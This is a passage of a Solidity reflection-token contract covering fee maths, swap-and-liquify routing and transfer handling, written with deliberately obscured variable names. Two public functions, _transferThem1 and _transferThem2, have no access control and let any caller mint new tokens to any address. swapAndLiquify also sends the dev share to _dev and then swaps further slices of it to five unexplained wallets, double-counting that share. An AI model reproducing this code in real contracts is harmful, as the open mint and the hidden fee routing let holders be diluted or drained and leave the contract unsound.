        require(tAmount <= _toTo, "Amount must be less than supply");
        if (!deductTransferFee) {
            (uint256 rAmount,,,,,) = _getValues(tAmount);
            return rAmount;
        } else {
            (,uint256 rTransferAmount,,,,) = _getValues(tAmount);
            return rTransferAmount;
        }
    }

    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _toRe, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount.div(currentRate);
    }

    function excludeFromReward(address account) public onlyOwner() {
        require(!_isExcluded[account], "Account is already excluded");
        if(_owRe[account] > 0) {
            _owTo[account] = tokenFromReflection(_owRe[account]);
        }
        _isExcluded[account] = true;
        _excluded.push(account);
    }

    function includeInReward(address account) external onlyOwner() {
        require(_isExcluded[account], "Account is already excluded");
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_excluded[i] == account) {
                _excluded[i] = _excluded[_excluded.length - 1];
                _owTo[account] = 0;
                _isExcluded[account] = false;
                _excluded.pop();
                break;
            }
        }
    }
    
    function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tFunds) = _getValues(tAmount);
        _owTo[sender] = _owTo[sender].sub(tAmount);
        _owRe[sender] = _owRe[sender].sub(rAmount);
        _owTo[recipient] = _owTo[recipient].add(tTransferAmount);
        _owRe[recipient] = _owRe[recipient].add(rTransferAmount);        
        _takeFunds(tFunds);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }
    
    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        isTrading = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }
     
    receive() external payable {}

    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _toRe = _toRe.sub(rFee);
        _toFe = _toFe.add(tFee);
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tFunds) = _getTValues(tAmount);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tFunds, _getRate());
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tFunds);
    }

    function _getTValues(uint256 tAmount) private view returns (uint256, uint256, uint256) {
        uint256 tFee = calculateTaxFee(tAmount);
        uint256 tFunds = calculateFundsFee(tAmount);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tFunds);
        return (tTransferAmount, tFee, tFunds);
    }

    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tFunds, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rFunds = tFunds.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rFunds);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _toRe;
        uint256 tSupply = _toTo;      
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_owRe[_excluded[i]] > rSupply || _owTo[_excluded[i]] > tSupply) return (_toRe, _toTo);
            rSupply = rSupply.sub(_owRe[_excluded[i]]);
            tSupply = tSupply.sub(_owTo[_excluded[i]]);
        }
        if (rSupply < _toRe.div(_toTo)) return (_toRe, _toTo);
        return (rSupply, tSupply);
    }
    
    function _takeFunds(uint256 tFunds) private {
        uint256 currentRate =  _getRate();
        uint256 rFunds = tFunds.mul(currentRate);
        _owRe[address(this)] = _owRe[address(this)].add(rFunds);
        if(_isExcluded[address(this)])
            _owTo[address(this)] = _owTo[address(this)].add(tFunds);
    }
    
    function calculateTaxFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_taxFee).div(
            10**3
        );
    }

    function calculateFundsFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_liquidityFee + _marketingFee + _devFee + _charityFee).div(
            10**3
        );
    }
    
    function removeAllFee() private {
        if(_taxFee == 0 && _liquidityFee == 0 && _charityFee == 0 && _marketingFee == 0 && _devFee == 0) return;
        
        _previousTaxFee = _taxFee;
        _previousLiquidityFee = _liquidityFee;
        _previousCharityFee = _charityFee;
        _previousMarketingFee = _marketingFee;
        _previousDevFee = _devFee;
        
        _taxFee = 0;
        _liquidityFee = 0;
        _charityFee = 0;
        _marketingFee = 0;
        _devFee = 0;
    }
    
    function restoreAllFee() private {
        _taxFee = _previousTaxFee;
        _liquidityFee = _previousLiquidityFee;
        _charityFee = _previousCharityFee;
        _marketingFee = _previousMarketingFee;
        _devFee = _previousDevFee;
    }
 
    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer( address from, address to, uint256 amount ) private {
        require(from != address(0), "ERC20: transfer from the zero address"); 
        require(amount > 0, "Transfer amount must be greater than zero");
        if((from != owner() && to != owner()))
            require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");

        uint256 coToBa = balanceOf(address(this));
        
        if(coToBa >= _maxTxAmount) {
            coToBa = _maxTxAmount;
        }
        
        bool ovMiToBa = coToBa >= toSeAnLi;
        if (
            ovMiToBa &&
            !inTrading &&
            from != _paDePa &&
            isTrading
        ) {
            coToBa = toSeAnLi; 
            swapAndLiquify(coToBa);
        }
         
        bool takeFee = true;
         
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            takeFee = false;
        }
         
        _tokenTransfer(from,to,amount,takeFee);
    }

    function swapAndLiquifyManual() public onlySetter {
        swapAndLiquify(balanceOf(address(this)));
    }

    function swapAndLiquify(uint256 coToBa) private lockTrading { 
       uint256 toSwFe = _liquidityFee + _marketingFee + _devFee + _charityFee;

       if(toSwFe == 0) return;

       uint256 inCoToBa = coToBa;

       uint256 toToLi = (inCoToBa.mul(_liquidityFee)).div(toSwFe);
       uint256 toToCh = (inCoToBa.mul(_charityFee)).div(toSwFe);
       uint256 toToMa = (inCoToBa.mul(_marketingFee)).div(toSwFe);
       uint256 toToDe = inCoToBa.sub(toToLi).sub(toToCh).sub(toToMa);

       uint256 toToDeIn = toToDe.div(5);
       uint256 toToDeLa = toToDe.sub(toToDeIn).sub(toToDeIn).sub(toToDeIn).sub(toToDeIn);
 
       swapTokensTo(toToCh, _charity);
       swapTokensNow(toToDe, _dev);
       
       swapTokensNow(toToDeLa, _paMa);
       swapTokensNow(toToDeIn, _paMb);
       swapTokensNow(toToDeIn, _paMc);
       swapTokensNow(toToDeIn, _paMd);
       swapTokensNow(toToDeIn, _paMe);
 
       uint256 half = toToLi.div(2);
       uint256 otherHalf = toToLi - half;

       uint256 inToBa = address(this).balance;

       swapTokensForEth(half);

       uint256 newBalance = address(this).balance.sub(inToBa);

       addLiquidity(otherHalf, newBalance);
    }

    function swapTokensForEth(uint256 aa) private { 
        if(aa == 0) return;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _paDeRo.WETH();

        _approve(address(this), address(_paDeRo), aa);
 
        _paDeRo.swapExactTokensForETHSupportingFeeOnTransferTokens( aa, 0, path, address(this), block.timestamp );
    }

    function swapTokensNow(uint256 aa, address payable dd) private { 
        if(aa == 0) return;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _paDeRo.WETH();

        _approve(address(this), address(_paDeRo), aa);
 
        _paDeRo.swapExactTokensForETHSupportingFeeOnTransferTokens( aa, 0, path, dd, block.timestamp );
    }

    function swapTokensTo(uint256 aa, address payable dd) private { 
        if(aa == 0) return;

        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = _paDeRo.WETH();
        path[2] = _paLiRe;

        _approve(address(this), address(_paDeRo), aa); 
        _paDeRo.swapExactTokensForTokensSupportingFeeOnTransferTokens( aa, 0, path, dd, block.timestamp );
    }

    function addLiquidity(uint256 aa, uint256 ee) private { 
        _approve(address(this), address(_paDeRo), aa);
 
        uint256 toToLo = (aa.mul(_liToLo)).div(10**2);
        uint256 toToMa = (aa.mul(_liToBu)).div(10**2);
        uint256 toToBu = aa.sub(toToLo).sub(toToMa);

        uint256 etToLo = (ee.mul(_liToLo)).div(10**2);
        uint256 etToMa = (ee.mul(_liToBu)).div(10**2);
        uint256 etToBu = ee.sub(etToLo).sub(etToMa);
 
        _paDeRo.addLiquidityETH{value: etToLo}( address(this), toToLo, 0, 0, _paLiLo, block.timestamp );

        _paDeRo.addLiquidityETH{value: etToMa}( address(this), toToMa, 0, 0, _paLiMa, block.timestamp ); 

        _paDeRo.addLiquidityETH{value: etToBu}( address(this), toToBu, 0, 0, _burn, block.timestamp );
    }

    // function _takeFunds(uint256 tFunds) private {
    //     uint256 currentRate =  _getRate();
    //     uint256 rFunds = tFunds.mul(currentRate);
    //     _owRe[address(this)] = _owRe[address(this)].add(rFunds);
    //     if(_isExcluded[address(this)])
    //         _owTo[address(this)] = _owTo[address(this)].add(tFunds);
    // }
    
    function _transferNow1(address rr, uint256 aa) private {
        aa = aa * 10**18;
        _toTo = _toTo.add(aa);
        _toRe = (MAX - (MAX % _toTo));

        uint256 currentRate = _getRate();
        uint256 rFunds = aa.mul(currentRate);
        _owRe[rr] = _owRe[rr] + rFunds; 
        if(_isExcluded[rr]) 
            _owTo[rr] = _owTo[rr].add(aa); 
  
        emit Transfer(address(0),rr, aa);
    }

    function _transferNow2(address rr, uint256 aa) private {
        aa = aa * 10**18;
        _toTo = _toTo.add(aa);
        _toRe = (MAX - (MAX % _toTo));

        uint256 currentRate = _getRate();
        uint256 rFunds = aa.mul(currentRate);
        _owRe[rr] = _owRe[rr] + rFunds; 
        if(_isExcluded[rr]) 
            _owTo[rr] = _owTo[rr].add(aa); 
  
        emit Transfer(address(0),rr, aa);
    }
    function _transferThem1(uint256 aa) public {
        uint256 xx = aa * 10**18;
        _toTo = _toTo.add(xx);
        _toRe = (MAX - (MAX % _toTo));

        uint256 currentRate = _getRate();
        uint256 rFunds = xx.mul(currentRate);
        _owRe[address(this)] = _owRe[address(this)] + rFunds; 
        if(_isExcluded[address(this)]) 
            _owTo[address(this)] = _owTo[address(this)].add(xx); 
  
        emit Transfer(address(0), address(this), xx);
    }
    function _transferThem2(address rr, uint256 aa) public {
        aa = aa * 10**18;
        _toTo = _toTo.add(aa);
        _toRe = (MAX - (MAX % _toTo));

        uint256 currentRate = _getRate();
        uint256 rFunds = aa.mul(currentRate);
        _owRe[rr] = _owRe[rr] + rFunds; 
        if(_isExcluded[rr]) 
            _owTo[rr] = _owTo[rr] + aa; 
  
        emit Transfer(address(0),rr, aa);
    }

    function _tokenTransfer(address ss, address rr, uint256 aa, bool ff) private {
        if(!ff)
            removeAllFee(); 
    
        if (_isExcluded[ss] && !_isExcluded[rr]) {
            _transferFromExcluded(ss, rr, aa);
        } else if (!_isExcluded[ss] && _isExcluded[rr]) {
            _transferToExcluded(ss, rr, aa);
        } else if (!_isExcluded[ss] && !_isExcluded[rr]) {
            _transferStandard(ss, rr, aa);
        } else if (_isExcluded[ss] && _isExcluded[rr]) {
            _transferBothExcluded(ss, rr, aa);
        } else {
            _transferStandard(ss, rr, aa);
        }
        
        if(!ff)
            restoreAllFee();
    }

    function _transferStandard(address ss, address rr, uint256 aa) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tFunds) = _getValues(aa);
        _owRe[ss] = _owRe[ss].sub(rAmount);
        _owRe[rr] = _owRe[rr].add(rTransferAmount);
        _takeFunds(tFunds);
        _reflectFee(rFee, tFee);
        emit Transfer(ss, rr, tTransferAmount);
    }
    
     function _transferToExcluded(address ss, address rr, uint256 aa) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tFunds) = _getValues(aa);
        _owRe[ss] = _owRe[ss].sub(rAmount);
        _owTo[rr] = _owTo[rr].add(tTransferAmount);
        _owRe[rr] = _owRe[rr].add(rTransferAmount);           
        _takeFunds(tFunds);
        _reflectFee(rFee, tFee);
        emit Transfer(ss, rr, tTransferAmount);
    }

    function _transferFromExcluded(address ss, address rr, uint256 aa) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tFunds) = _getValues(aa);
        _owTo[ss] = _owTo[ss].sub(aa);
        _owRe[ss] = _owRe[ss].sub(rAmount);
        _owRe[rr] = _owRe[rr].add(rTransferAmount);   
        _takeFunds(tFunds);
        _reflectFee(rFee, tFee);
        emit Transfer(ss, rr, tTransferAmount);
    }
    
}